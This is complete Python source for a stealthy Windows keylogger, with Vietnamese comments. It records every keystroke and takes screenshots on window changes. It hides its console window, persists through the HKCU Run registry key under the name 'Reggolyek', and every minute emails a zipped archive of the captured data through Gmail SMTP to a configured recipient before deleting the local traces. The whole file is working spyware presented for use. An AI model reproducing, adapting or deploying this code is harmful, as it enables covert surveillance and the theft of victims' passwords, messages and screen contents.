# ============================
# IMPORT LIBRARIES
# ============================
import os                    # Thao tác với file system, paths, directories
import time                  # Xử lý thời gian, delays
import threading             # Tạo threads cho email timer
from datetime import datetime # Format timestamps cho logs và files
import keyboard              # Hook keyboard events để capture phím bấm
import pygetwindow as gw     # Lấy thông tin cửa sổ active để chụp screenshot
from PIL import ImageGrab    # Chụp screenshot màn hình
import ctypes                # Gọi Windows API để ẩn console, check uptime
import win32api              # Windows API functions để check Caps Lock, Shift
import smtplib               # Gửi email qua SMTP
import zipfile               # Tạo file zip để nén data trước khi gửi email
import shutil                # Copy files, remove directories
from email.mime.multipart import MIMEMultipart  # Tạo email với attachments
from email.mime.base import MIMEBase            # Base class cho attachments
from email.mime.text import MIMEText            # Text content cho email
from email import encoders                      # Encode attachments
from dotenv import load_dotenv                  # Load environment variables từ .env file
import winreg                # Thao tác với Windows Registry để add startup
import sys                   # System specific parameters và functions

# ============================
# CONFIGURATION CONSTANTS
# ============================
VISIBLE = False         # False: Ẩn console window để stealth
                       # True: Hiện console để debug
                       
BOOT_WAIT = True       # True: Chờ hệ thống boot xong mới chạy
                       # False: Chạy ngay lập tức
                       
AUTO_STARTUP = True    # True: Tự động thêm vào Windows startup
                       # False: Không auto startup
                       
FORMAT = 0             # 0: Format phím mặc định (readable)
                       # 10: Format decimal codes
                       # 16: Format hexadecimal codes

EMAIL_INTERVAL = 1 * 60  # Gửi email mỗi 1 phút (1 * 60 = 60 seconds)

# ============================
# GLOBAL EMAIL CONFIG VARIABLES
# ============================
# Declare global variables để lưu email config
GMAIL_EMAIL = None
GMAIL_PASSWORD = None  
RECIPIENT_EMAIL = None

# ============================
# VIRTUAL KEY CONSTANTS
# ============================
VK_CAPITAL = 0x14      # Virtual key code cho Caps Lock
VK_SHIFT = 0x10        # Virtual key code cho Shift key

# ============================
# KEY MAPPING DICTIONARY
# ============================
# Map các phím đặc biệt thành string readable
KEY_MAPPING = {
    'backspace': '[BACKSPACE]',    # Phím Backspace
    'enter': '\n',                 # Enter tạo new line
    'space': '_',                  # Space hiển thị như underscore
    'tab': '[TAB]',               # Tab key
    'shift': '[SHIFT]',           # Shift key
    'ctrl': '[CTRL]',             # Control key
    'alt': '[ALT]',               # Alt key
    'esc': '[ESCAPE]',            # Escape key
    'end': '[END]',               # End key
    'home': '[HOME]',             # Home key
    'left': '[LEFT]',             # Left arrow
    'right': '[RIGHT]',           # Right arrow
    'up': '[UP]',                 # Up arrow
    'down': '[DOWN]',             # Down arrow
    'page up': '[PG_UP]',         # Page Up
    'page down': '[PG_DOWN]',     # Page Down
    'caps lock': '[CAPSLOCK]',    # Caps Lock
    'delete': '[DELETE]',         # Delete key
    'insert': '[INSERT]',         # Insert key
}

# ============================
# MAIN KEYLOGGER CLASS
# ============================
class Keylogger:
    def __init__(self):
        """
        Constructor - Khởi tạo keylogger với tất cả các components cần thiết
        """
        # STEP 1: Setup working directory trong AppData để có quyền write
        self.setup_appdata_directory()
        
        # STEP 2: Load email configuration từ .env file
        self.load_env_config()
        
        # STEP 3: Initialize instance variables
        self.output_file = None      # File handle cho log file hiện tại
        self.current_hour = -1       # Track giờ hiện tại để tạo file log mới mỗi giờ
        self.last_window = ""        # Track cửa sổ cuối cùng để detect window changes
        self.running = False         # Flag để control main loop
        self.email_timer = None      # Timer object cho scheduled email sending
        
        # STEP 4: Create folder structure để lưu data
        self.create_folders()
        
        # STEP 5: Validate email configuration
        self.validate_email_config()
        
        # STEP 6: Setup auto startup nếu enabled
        if AUTO_STARTUP:
            self.setup_auto_startup()
    
    def setup_appdata_directory(self):
        """
        Setup working directory trong AppData\Local để tránh permission issues
        AppData\Local luôn có quyền write và không bị affect bởi UAC
        """
        try:
            # Lấy đường dẫn AppData\Local từ environment variable
            # Fallback nếu không có LOCALAPPDATA env var
            appdata_local = os.environ.get('LOCALAPPDATA', os.path.expanduser('~\\AppData\\Local')) #Result: C:\Users\{username}\AppData\Local
            
            # Tạo thư mục base trong AppData\Local với tên "Reggolyek"
            self.base_dir = os.path.join(appdata_local, "Reggolyek")
            os.makedirs(self.base_dir, exist_ok=True)  # exist_ok=True: không error nếu folder đã tồn tại
            
            # Setup paths cho các thư mục con
            self.captured_folder = os.path.join(self.base_dir, "captured")        # Main data folder
            self.logs_folder = os.path.join(self.captured_folder, "logs")         # Keyboard logs
            self.screenshots_folder = os.path.join(self.captured_folder, "screenshots")  # Screenshots
            
            # Debug output để track paths
            print(f"Base directory: {self.base_dir}")
            print(f"Captured folder: {self.captured_folder}")
            
        except Exception as e:
            print(f"Error setting up AppData directory: {e}")
    
    def load_env_config(self):
        """
        Load cấu hình email từ .env file với multiple fallback locations
        Tìm kiếm .env file ở Downloads, nếu thích có thể bỏ file env và thay vào file luôn
        """
        global GMAIL_EMAIL, GMAIL_PASSWORD, RECIPIENT_EMAIL  # Declare global để modify
        
        try:
            # Lấy thư mục Downloads của user hiện tại
            downloads_folder = os.path.join(os.path.expanduser('~'), 'Downloads')
            
            # Danh sách các locations để tìm .env file (theo thứ tự ưu tiên)
            env_locations = [
                os.path.join(self.base_dir, '.env'),  # 1. AppData folder (nơi lưu permanent)
                os.path.join(downloads_folder, 'Reggolyek', 'keylogger', '.env'),  # 2. Dev folder chính
                os.path.join(downloads_folder, 'Reggolyek', '.env'),  # 3. Parent folder
            ]
            
            # Loop qua các locations để tìm .env file
            loaded = False
            for env_path in env_locations:
                if os.path.exists(env_path):  # Check file tồn tại
                    load_dotenv(env_path)     # Load environment variables từ file
                    print(f"Loaded .env from: {env_path}")
                    loaded = True
                    break  # Dừng tìm kiếm khi đã tìm thấy
            
            # Fallback nếu không tìm thấy .env file nào
            if not loaded:
                print("No .env file found, using environment variables")
                load_dotenv()  # Load từ system environment variables
            
            # Extract email configuration từ environment variables
            GMAIL_EMAIL = os.getenv('GMAIL_EMAIL')        # Gmail account để gửi
            GMAIL_PASSWORD = os.getenv('GMAIL_PASSWORD')  # App password (không phải password thường)
            RECIPIENT_EMAIL = os.getenv('RECIPIENT_EMAIL') # Email nhận data
            
            # Debug output
            print(f"Email config loaded: {GMAIL_EMAIL} -> {RECIPIENT_EMAIL}")
            
            # Auto-copy .env file to AppData để lần sau không cần tìm lại
            if loaded and not os.path.exists(os.path.join(self.base_dir, '.env')):
                for env_path in env_locations[1:]:  # Skip AppData location (index 0)
                    if os.path.exists(env_path):
                        try:
                            shutil.copy2(env_path, os.path.join(self.base_dir, '.env'))
                            print(f"Copied .env to AppData: {self.base_dir}")
                            break
                        except:
                            pass  # Ignore copy errors
            
        except Exception as e:
            print(f"Error loading env config: {e}")
            # Set defaults nếu load failed
            GMAIL_EMAIL = GMAIL_PASSWORD = RECIPIENT_EMAIL = None
    
    def create_folders(self):
        """
        Tạo folder structure cần thiết để lưu logs và screenshots
        Includes write permission testing
        """
        try:
            print(f"Creating folders in: {self.captured_folder}")
            
            # Tạo các folders (exist_ok=True để không error nếu đã tồn tại)
            os.makedirs(self.captured_folder, exist_ok=True)      # Main captured folder
            os.makedirs(self.logs_folder, exist_ok=True)          # Logs subfolder
            os.makedirs(self.screenshots_folder, exist_ok=True)   # Screenshots subfolder
            
            print(f"Created folders successfully at: {self.captured_folder}")
        except Exception as e:
            print(f"Error creating folders: {e}")
    
    def validate_email_config(self):
        """
        Kiểm tra email configuration có đầy đủ không
        Returns True nếu có thể gửi email, False nếu thiếu config
        """
        # Check tất cả 3 fields có value không (not None, not empty)
        if not all([GMAIL_EMAIL, GMAIL_PASSWORD, RECIPIENT_EMAIL]):
            print("Warning: Email configuration incomplete. Email sending will be disabled.")
            print("Please check your .env file.")
            return False
        print(f"Email configuration validated. Will send to: {RECIPIENT_EMAIL}")
        return True
    
    def create_zip_archive(self):
        """
        Tạo file ZIP chứa toàn bộ captured data (logs + screenshots)
        Được gọi trước khi gửi email để nén data
        """
        try:
            # Tạo timestamp cho filename
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            zip_filename = os.path.join(self.base_dir, f"captured_data_{timestamp}.zip")
            
            # Tạo ZIP file với compression
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                # Walk through toàn bộ captured folder
                for root, dirs, files in os.walk(self.captured_folder):
                    for file in files:
                        file_path = os.path.join(root, file)  # Full path của file
                        # Tạo relative path trong ZIP (loại bỏ base_dir prefix)
                        arcname = os.path.relpath(file_path, self.base_dir)
                        zipf.write(file_path, arcname)  # Add file vào ZIP
                        print(f"Added to zip: {arcname}")
            
            print(f"Zip archive created: {zip_filename}")
            return zip_filename
        except Exception as e:
            print(f"Error creating zip archive: {e}")
            return None
    
    def send_email_with_attachment(self, zip_filepath):
        """
        Gửi email với ZIP file đính kèm qua Gmail SMTP
        """
        try:
            print(f"Sending email to {RECIPIENT_EMAIL}...")
            
            # Tạo multipart message để support attachments
            msg = MIMEMultipart()
            msg['From'] = GMAIL_EMAIL
            msg['To'] = RECIPIENT_EMAIL
            msg['Subject'] = f"System Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            # Tạo email body với thông tin chi tiết
            body = f"""
System Report

Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Data Location: {self.base_dir}

This email contains captured system data.

Files included:
- Log files from keyboard activity
- Screenshots from window changes

This is an automated message sent every {EMAIL_INTERVAL//60} minutes.
            """
            
            # Attach body text vào email
            msg.attach(MIMEText(body, 'plain'))
            
            # Đính kèm ZIP file nếu tồn tại
            if zip_filepath and os.path.exists(zip_filepath):
                with open(zip_filepath, "rb") as attachment:
                    # Tạo MIMEBase object cho binary attachment
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())  # Read file content
                
                # Encode attachment in base64
                encoders.encode_base64(part)
                
                # Add header để browser hiểu đây là attachment
                part.add_header(
                    'Content-Disposition',
                    f'attachment; filename= {os.path.basename(zip_filepath)}'
                )
                msg.attach(part)  # Add attachment vào message
                print(f"Attached file: {zip_filepath}")
            
            # Gửi email qua Gmail SMTP
            server = smtplib.SMTP('smtp.gmail.com', 587)  # Gmail SMTP server, 587: Port cho STARTTLS (secure connection)
            # Alternative: Port 465 cho SSL, port 25 cho unencrypted
            server.starttls()  # Enable TLS encryption
            server.login(GMAIL_EMAIL, GMAIL_PASSWORD)     # Login với app password
            text = msg.as_string()  # Convert message thành string
            server.sendmail(GMAIL_EMAIL, RECIPIENT_EMAIL, text)  # Send email
            server.quit()  # Close connection
            
            print(f"Email sent successfully to {RECIPIENT_EMAIL}")
            return True
            
        except Exception as e:
            print(f"Error sending email: {e}")
            return False
    
    def delete_captured_folder(self):
        """
        Xóa toàn bộ captured folder sau khi gửi email thành công
        Cleanup để tránh data accumulation và save disk space
        """
        try:
            # Đóng file log hiện tại trước khi xóa
            if self.output_file:
                try:
                    self.output_file.close()
                    self.output_file = None
                except:
                    pass  # Ignore close errors
            
            # Remove toàn bộ captured directory tree
            if os.path.exists(self.captured_folder):
                shutil.rmtree(self.captured_folder)  # Recursively delete
                print(f"Deleted folder: {self.captured_folder}")
            
            # Recreate folder structure cho lần logging tiếp theo
            self.create_folders()
            self.current_hour = -1  # Reset hour tracking để tạo file log mới
            
        except Exception as e:
            print(f"Error deleting captured folder: {e}")
    
    def send_and_cleanup(self):
        """
        Main function để zip data, gửi email và cleanup
        Được gọi mỗi EMAIL_INTERVAL hoặc khi shutdown
        """
        try:
            print("\n" + "="*50)
            print("Starting email send and cleanup process...")
            
            # Check có data để gửi không
            has_logs = os.path.exists(self.logs_folder) and os.listdir(self.logs_folder)
            has_screenshots = os.path.exists(self.screenshots_folder) and os.listdir(self.screenshots_folder)
            
            # Nếu không có data thì skip
            if not has_logs and not has_screenshots:
                print("No data to send")
                print("="*50 + "\n")
                return
            
            # Tạo ZIP archive
            zip_filepath = self.create_zip_archive()
            if not zip_filepath:
                print("Failed to create zip archive")
                print("="*50 + "\n")
                return
            
            # Gửi email với attachment
            email_sent = self.send_email_with_attachment(zip_filepath)
            
            # Cleanup based on email result
            if email_sent:
                print("Email sent successfully!")
                # Xóa ZIP file temporary
                try:
                    os.remove(zip_filepath)
                    print(f"Deleted zip file: {zip_filepath}")
                except:
                    pass
                
                # Xóa toàn bộ captured data vì đã gửi thành công
                self.delete_captured_folder()
                print("Cleanup completed successfully!")
            else:
                print("Failed to send email, keeping files")
                # Xóa ZIP file nhưng giữ lại captured data
                try:
                    os.remove(zip_filepath)
                except:
                    pass
            
            print("="*50 + "\n")
                
        except Exception as e:
            print(f"Error in send_and_cleanup: {e}")
    
    def schedule_email_sending(self):
        """
        Scheduled function để gửi email định kỳ
        Tự động lên lịch cho lần tiếp theo sau khi xong
        """
        # Chỉ gửi email nếu config hợp lệ
        if self.validate_email_config():
            self.send_and_cleanup()
        
        # Schedule lần tiếp theo nếu keylogger vẫn đang chạy
        if self.running:
            print(f"Next email scheduled in {EMAIL_INTERVAL//60} minutes...")
            # Tạo timer mới cho lần tiếp theo
            self.email_timer = threading.Timer(EMAIL_INTERVAL, self.schedule_email_sending)
            self.email_timer.start()
        
    def setup_stealth(self):
        """
        Ẩn console window để keylogger chạy ngầm không bị phát hiện
        Chỉ hoạt động khi VISIBLE = False
        """
        if not VISIBLE:
            # Get handle của console window hiện tại
            console_window = ctypes.windll.kernel32.GetConsoleWindow()
            if console_window:
                # Hide window bằng Windows API (SW_HIDE = 0)
                ctypes.windll.user32.ShowWindow(console_window, 0)
    
    def is_system_booting(self):
        """
        Check xem hệ thống có đang trong quá trình boot không
        Dùng GetTickCount64 để lấy uptime của hệ thống
        """
        try:
            # GetTickCount64 returns milliseconds since system boot
            uptime = ctypes.windll.kernel32.GetTickCount64() / 1000  # Convert to seconds
            return uptime < 120  # Consider booting nếu uptime < 2 minutes
        except:
            return False  # Assume not booting nếu API call fails
    
    def wait_for_boot(self):
        """
        Chờ hệ thống boot xong trước khi bắt đầu keylogging
        Tránh conflict với boot process và đảm bảo system stable
        """
        if BOOT_WAIT:
            while self.is_system_booting():
                print("System is still booting up. Waiting 10 seconds...")
                time.sleep(10)  # Wait 10 seconds trước khi check lại
    
    def get_active_window_title(self):
        """
        Lấy title của cửa sổ đang active để track application context
        Dùng để trigger screenshot khi user chuyển ứng dụng
        """
        try:
            window = gw.getActiveWindow()  # Get active window object
            if window:
                return window.title  # Return window title
        except:
            pass  # Ignore errors (window might be None)
        return ""  # Return empty string nếu không lấy được
    
    def take_screenshot(self):
        """
        Chụp screenshot màn hình khi user chuyển cửa sổ
        Screenshots giúp hiểu context của keyboard activity
        """
        try:
            # Tạo timestamp cho filename
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            filename = f"screenshot_{timestamp}.png"
            filepath = os.path.join(self.screenshots_folder, filename)
            
            # Capture toàn bộ màn hình
            screenshot = ImageGrab.grab()
            screenshot.save(filepath)  # Save as PNG file
            print(f"Screenshot saved: {filepath}")
        except Exception as e:
            print(f"Error taking screenshot: {e}")
    
    def process_key(self, key_event):
        """
        Xử lý từng key event được capture bởi keyboard hook
        Main logic để log keys và handle window changes
        """
        try:
            now = datetime.now()
            
            # Check window change để trigger screenshot
            current_window = self.get_active_window_title()
            if current_window != self.last_window and current_window:
                self.take_screenshot()  # Chụp screenshot khi đổi window
                self.last_window = current_window  # Update last window
                # Log window change với timestamp
                timestamp_str = now.strftime("%Y-%m-%dT%H:%M:%S")
                self.write_to_log(f"\n\n[Window: {current_window} - at {timestamp_str}] ")
            
            # Format và log key
            key_str = self.format_key(key_event)
            if key_str:  # Chỉ log nếu format thành công
                self.write_to_log(key_str)
                
        except Exception as e:
            print(f"Error processing key: {e}")
    
    def format_key(self, key_event):
        """
        Format key event thành string representation
        Handle different FORMAT modes và special keys
        """
        try:
            key_name = key_event.name.lower()  # Get key name in lowercase
            
            # FORMAT 10: Decimal ASCII codes
            if FORMAT == 10:
                if len(key_name) == 1:  # Single character
                    return f'[{ord(key_name)}]'  # Return ASCII code
                else:
                    return f'[{key_name.upper()}]'  # Return key name in caps
            
            # FORMAT 16: Hexadecimal ASCII codes
            elif FORMAT == 16:
                if len(key_name) == 1:  # Single character
                    return f'[{hex(ord(key_name))}]'  # Return hex code
                else:
                    return f'[{key_name.upper()}]'  # Return key name in caps
            
            # FORMAT 0: Default readable format
            else:
                # Check nếu là special key có mapping
                if key_name in KEY_MAPPING:
                    return KEY_MAPPING[key_name]
                
                # Handle regular character keys
                elif len(key_name) == 1:
                    try:
                        # Check Caps Lock state (bit 0 = toggle state)
                        caps_on = win32api.GetKeyState(VK_CAPITAL) & 1
                        # Check Shift state (bit 15 = pressed state)
                        shift_pressed = (win32api.GetKeyState(VK_SHIFT) & 0x8000) != 0
                        
                        # XOR logic: uppercase nếu (caps XOR shift) = True
                        if caps_on ^ shift_pressed:
                            return key_name.upper()
                        else:
                            return key_name.lower()
                    except:
                        # Fallback nếu Windows API fails
                        return key_name.lower()
                
                # Handle other special keys
                else:
                    return f'[{key_name.upper()}]'
                    
        except Exception as e:
            return f'[ERROR: {e}]'  # Return error nếu formatting fails
    
    def write_to_log(self, text):
        """
        Ghi text vào log file với hourly rotation
        Tạo file log mới mỗi giờ để organize data
        """
        try:
            now = datetime.now()
            
            # Check nếu cần tạo file log mới (mỗi giờ)
            if self.current_hour != now.hour:
                # Đóng file cũ nếu có
                if self.output_file:
                    self.output_file.close()
                
                # Update current hour
                self.current_hour = now.hour
                
                # Tạo filename với timestamp
                filename = now.strftime("%Y-%m-%d__%H-%M-%S.log")
                filepath = os.path.join(self.logs_folder, filename)
                
                # Mở file mới với append mode và UTF-8 encoding
                self.output_file = open(filepath, 'a', encoding='utf-8')
                print(f"Logging to: {filepath}")
            
            # Ghi text vào file
            if self.output_file:
                self.output_file.write(text)
                self.output_file.flush()  # Force write to disk
            
            # Debug output nếu VISIBLE = True
            if VISIBLE:
                print(text, end='')  # Print without newline
                
        except Exception as e:
            print(f"Error writing to log: {e}")
    
    def on_key_event(self, key_event):
        """
        Callback function được gọi bởi keyboard hook
        Filter chỉ KEY_DOWN events để tránh duplicate
        """
        # Chỉ xử lý key press events, bỏ qua key release
        if key_event.event_type == keyboard.KEY_DOWN:
            self.process_key(key_event)
    
    def setup_auto_startup(self):
        """
        Thêm keylogger vào Windows startup registry
        Sẽ tự động chạy khi Windows boot
        """
        try:
            # Lấy đường dẫn executable
            if getattr(sys, 'frozen', False):
                # Nếu chạy từ .exe (PyInstaller)
                exe_path = sys.executable
            else:
                # Nếu chạy từ .py script
                exe_path = os.path.abspath(__file__)
            
            # Mở Windows Registry key cho startup programs
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,  # Current user only (không cần admin)
                r"Software\Microsoft\Windows\CurrentVersion\Run",  # Startup registry path
                0,
                winreg.KEY_SET_VALUE  # Permission để write
            )
            
            # Add registry entry với tên "Reggolyek"
            winreg.SetValueEx(key, "Reggolyek", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)  # Đóng registry key
            
            print("Added to Windows startup")
            
        except Exception as e:
            print(f"Failed to add to startup: {e}")
    
    def remove_from_startup(self):
        """
        Xóa keylogger khỏi Windows startup
        Dùng khi muốn uninstall hoặc disable auto startup
        """
        try:
            # Mở registry key
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            # Xóa registry entry
            winreg.DeleteValue(key, "Reggolyek")
            winreg.CloseKey(key)
            print("Removed from startup")
        except:
            pass  # Ignore errors (entry might not exist)

    def start(self):
        """
        Main function để start keylogger
        Setup tất cả components và enter main loop
        """
        print("Starting system monitor...")
        print(f"Data will be stored in: {self.base_dir}")
        
        # STEP 1: Setup stealth mode (ẩn console)
        self.setup_stealth()
        
        # STEP 2: Chờ system boot xong
        self.wait_for_boot()
        
        # STEP 3: Start keyboard hooking
        self.running = True
        keyboard.hook(self.on_key_event)  # Register callback cho keyboard events
        
        # STEP 4: Start email timer nếu có config
        if self.validate_email_config():
            print(f"Email sending scheduled every {EMAIL_INTERVAL//60} minutes")
            # Tạo timer để gọi schedule_email_sending sau EMAIL_INTERVAL
            self.email_timer = threading.Timer(EMAIL_INTERVAL, self.schedule_email_sending)
            self.email_timer.start()
        
        print("System monitor started.")
        
        try:
            # MAIN LOOP: Giữ program chạy
            while self.running:
                time.sleep(0.1)  # Sleep để không consume CPU
        except KeyboardInterrupt:
            # Handle Ctrl+C gracefully
            print("\nStopping system monitor...")
            self.stop()
    
    def stop(self):
        """
        Gracefully stop keylogger và cleanup
        """
        print("Stopping keylogger...")
        self.running = False  # Stop main loop
        
        # Cancel email timer
        if self.email_timer:
            self.email_timer.cancel()
        
        # Send final email với data còn lại
        if self.validate_email_config():
            print("Sending final email before shutdown...")
            self.send_and_cleanup()
        
        # Unhook keyboard
        keyboard.unhook_all()
        
        # Close log file
        if self.output_file:
            self.output_file.close()
        
        print("System monitor stopped.")

# ============================
# MAIN FUNCTION
# ============================
def main():
    """
    Entry point đơn giản - chỉ start keylogger
    """
    # Create keylogger instance và start luôn
    keylogger = Keylogger()
    keylogger.start()

# ============================
# SCRIPT EXECUTION
# ============================
if __name__ == "__main__":
    main()